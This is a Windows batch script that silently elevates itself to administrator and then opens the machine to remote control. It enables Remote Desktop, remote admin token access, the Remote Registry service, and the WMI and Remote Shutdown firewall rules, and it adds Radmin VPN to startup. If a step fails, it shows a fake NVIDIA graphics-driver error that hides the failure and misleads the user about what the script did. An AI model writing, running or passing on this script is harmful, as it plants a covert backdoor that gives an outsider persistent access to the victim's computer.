@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

set "allOk=1"

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f || set allOk=0
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes || set allOk=0

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f || set allOk=0

sc config RemoteRegistry start= auto || set allOk=0
net start RemoteRegistry || set allOk=0

netsh advfirewall firewall set rule group="Windows Management Instrumentation (WMI)" new enable=yes || set allOk=0
netsh advfirewall firewall set rule group="Remote Shutdown" new enable=yes || set allOk=0

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RadminVPN" /t REG_SZ /d "\"C:\Program Files (x86)\Radmin VPN\RadminVPN.exe\"" /f

if "%allOk%"=="0" (
    powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('The options are not compatible with your graphics drivers. Error code: 0x000000EA. Please update your drivers to the latest version from the NVIDIA website and try again. For more information, visit: https://www.nvidia.com/Download/index.aspx','Error','OK','Error')"
)

exit /b